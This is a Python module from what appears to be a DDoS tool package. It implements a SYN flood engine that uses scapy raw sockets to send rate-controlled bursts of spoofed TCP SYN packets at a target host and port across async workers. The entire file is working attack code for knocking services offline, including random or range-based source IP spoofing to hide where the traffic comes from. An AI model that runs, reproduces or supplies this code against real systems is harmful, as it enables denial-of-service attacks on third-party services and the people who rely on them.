from __future__ import annotations

import asyncio
import ipaddress
import random

from ..config import Config, SynPayload
from .base import AttackEngine


class SynFlood(AttackEngine):
    """L4 SYN flood via scapy raw sockets. Needs root or CAP_NET_RAW; IP spoofing needs rp_filter off."""

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg.effective_rps(), cfg.workers, cfg.duration_sec)
        self.target_rps = cfg.effective_rps()
        self.syn = cfg.syn or SynPayload()
        host, _, port_s = cfg.target.partition(":")
        self.host = host
        self.port = int(port_s or 80)

    async def run(self) -> None:
        try:
            from scapy.all import IP, TCP, send  # lazy: optional dep
        except ImportError as e:  # pragma: no cover - env specific
            raise RuntimeError(
                "SYN flood needs scapy: pip install 'ddos-tool[syn]' (or: pip install scapy)"
            ) from e

        def build_packet() -> object:
            kwargs = {"dst": self.host}
            if self.syn.spoof_src:
                if self.syn.spoof_src == "random":
                    src = str(ipaddress.IPv4Address(random.randint(1, 2**32 - 2)))
                else:
                    network = ipaddress.ip_network(self.syn.spoof_src, strict=False)
                    # Include the network address for /31 and /32 ranges.
                    addresses = tuple(network.hosts()) or (network.network_address,)
                    src = str(random.choice(addresses))
                kwargs["src"] = src
            return IP(**kwargs) / TCP(sport=random.randint(1024, 65535), dport=self.port, flags="S")

        def burst(n: int) -> None:
            send([build_packet() for _ in range(n)], verbose=False)

        loop = asyncio.get_running_loop()
        per_worker = max(self.target_rps // self.workers, 1)

        async def worker() -> None:
            while True:
                await self.bucket.acquire(per_worker)
                await loop.run_in_executor(None, burst, per_worker)
                self.stats["sent"] += per_worker
                self.stats["ok"] += per_worker  # fire-and-forget; no ACK tracking in MVP

        workers = [asyncio.create_task(worker()) for _ in range(self.workers)]
        await asyncio.sleep(self.duration_sec)
        for w in workers:
            w.cancel()
        await asyncio.gather(*workers, return_exceptions=True)
